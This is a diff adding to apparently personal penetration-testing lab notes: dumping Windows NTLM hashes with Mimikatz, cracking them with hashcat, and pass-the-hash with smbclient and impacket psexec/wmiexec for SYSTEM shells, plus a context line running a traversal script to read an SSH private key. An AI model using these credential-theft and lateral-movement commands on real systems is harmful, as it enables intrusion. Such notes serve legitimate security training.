@@ -412,3 +412,142 @@ Found an Apache 2.4.49 server? Use the known directory traversal vuln.
 ```console
 $ bash ./50383.sh targets.txt /home/alfred/.ssh/id_rsa 
 ```
+
+## Working with Password Hashes
+
+When we gain privileged access to a system, we will be able to extract password hashes. We can also intercept or make Windows network authentication requests and use the in pass-the-hashes or relay attacks.
+
+### Cracking NTLM
+
+The NTLM hash implementation is used in the Security Account Manager (SAM) db file, which is used to assist auth for local or remote users.
+
+Microsoft has added the SYSKEY feature to prevent offline SAM db password attacks, partially encrypting the SAM file. Passwords are stored in one of two formats:
+- LAN Manager (LM) - based in DES, very insecure. Passwords are case insensitive and must be 14 characters or less. If a password is longer tha 7 chars, it is split into 2 strings and hashed separately. LM is disable by default beginning with Windows Vista and Windows Server 2008.
+- NTLM
+
+On modern systems, SAM hashes are stored as NTLM. Passwords are case sensitive and not split. However, they are NOT SALTED! Salts were implemented to prevent Rainbow Table Attacks, where attackers perform lookups on precomputed hashes to infer a plaintext password.
+
+NTLM hash = NTHash
+
+We cannoy copy, move, or rename, the SAM db from C:\Windows\system32\config\sam while the OS is running because the kernel locks the file.
+
+We can, however, use mimikatz to extract plain-text passwords and password hashes from various areas in Windows to use them in subsequent attacks. Mimikatz also has the sekurlsa module, which extracts password hashes from the Local Security Authority Subsystem (LSASS - handles user authentication, password changes, access token creation, etc) process memory.
+
+LSASS caches NTLM hashes and other creds which we can extract using sekurlsa in Mimikatz. LSASS runs as SYSTEM which is more privileged than a process started as Administrator.
+
+We can only extract passwords if we are running Mimikatz as Administrator or higher and have the SeDebugPrivilege, which enables use to debug all user processes.
+
+PsExec can also be used to elevate our privileges to SYSTEM. Or, we can use Mimikatz's built-in token elevation function (requires SeImpersonatePrivilege, but all local admins have this).
+
+Let's retrieve passwords from SAM of a target machine. In the target's PS:
+
+```console
+> Get-LocalUser
+Name               Enabled Description
+----               ------- -----------
+Administrator      False   Built-in account for administering the computer/domain
+DefaultAccount     False   A user account managed by the system.
+Guest              False   Built-in account for guest access to the computer/domain
+nelly              True
+offsec             True
+sam                True
+WDAGUtilityAccount False   A user account managed and used by the system for Windows Defender
+```
+
+Credentials are stored when users log on to a Windows system and when a service is run with a user account.
+
+Use Mimikatz in PS (as Administrator) to check for stored creds.
+
+```console
+> cd C:\tools 
+
+> ls
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----         5/31/2022  12:25 PM        1355680 mimikatz.exe
+
+> .\mimikatz.exe
+```
+
+Each mimikatz command has a module and a command, delimited by two colons, like privilege::debug. One of the most common is sekurlsa::logonpasswords, but it generates a ton of output. Enter token::elevate to elevate to SYSTEM user privileges and try lsadump::sam.
+
+```console
+> privilege::debug
+
+> token::elevate
+
+> lsadump::sam
+User : nelly
+  Hash NTLM: 3ae8e5f0ffabb3a627672e1600f1ba10
+```
+
+Copy the victim's hash to Kali.
+
+```console
+$ cat nelly.hash
+3ae8e5f0ffabb3a627672e1600f1ba10
+
+$ hashcat --help | grep -i "ntlm"
+...
+1000 | NTLM                                                       | Operating System
+
+$ hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+```
+
+Succeeded? RDP as that user.
+
+What if we can'r get the plaintext? We can still use the hash.
+
+### Passing NTLM
+
+Pass the Hash can be used to authenticate to a local or remote target without a plaintext password, which is possible because NTLM/LM hashes are not salted and remain static between sessions.We can use the same hash to authenticate to multiple targets, as long as the second target has an account with the same user and password. To use this into code execution, we also need the account to have admin privileges on the second target.
+
+If we don't user the local Administrator user in PtH, the target also needs to be configured a certain way to get code execution. Since Vista, Windows now has UAC remote restrictions enabled by default, which prevents software or commands from running with admin rights on remote systems and mitigates our attack vector for all users in the local admin group aside from the local Administrator account.
+
+Assume we have access to Computer1 with a password to a user. We need to extract the Administrator's NTLM hash and use it to authenticate to Computer2. In this example, we will try to gain access to an SMB share and PtH for an interactive shell on Computer2. Assume Administrator on both computers has the same password, which is common.
+
+Logged into Computer1 with creds we already have, go to Windows Explorer and enter the path of the SMB share (\\192.168.242.212\secrets) in the nav bar. You're prompted for creds. Try creds you already have, but if they don't work, use Mimikatz, and save the Administrator hash you get.
+
+To PtH, we need tools that support auth with NTLM hashes. Some examples are:
+- SMB enum and mgt: smbclient, CrackMapExec
+- Cmd injection: impacket scripts like psexec.py and wmiexec.py
+- RDP and WinRM if the user has the required rights
+- Mimikatz can PtH
+
+Let's go SMB with smbclient in kali.
+
+```console
+$ smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
+
+smb: \> dir
+  .                                   D        0  Thu Jun  2 16:55:37 2022
+  ..                                DHS        0  Thu Mar  7 17:56:32 2024
+  secrets.txt                         A       16  Thu Sep  1 12:23:32 2022
+
+smb: \> get secrets.txt 
+```
+
+We connected to SMB share successfully with the hash of a password. Now, let's try to get a reverse shell using psexec.py from impacket, which searches for a writable share and uploads an exe to it, lastly registering the exe as a Windows service and starting it to give us our interactive shell or code execution.
+
+```console
+// impacket-psexec first arg is -hashes in format of LMHash:NTHash, we only need NT so fill LM with 0s
+
+// we could ad another argument at the end of this command which is used to determine which command psexec should execute on the target, but leaving it empty executes cmd.exe and gives us a shell
+
+$ impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
+
+C:\Windows\system32> 
+```
+
+Psexec.py will always give us a shell as SYSTEM instead of the user we used to authenticate. We could use wmiexec.py to get a shell as the user we authenticate as as follows:
+
+```console
+$ impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
+[*] SMBv3.0 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+C:\>whoami
+files02\administrator
+```
+
+### Cracking Net-NTLMv2
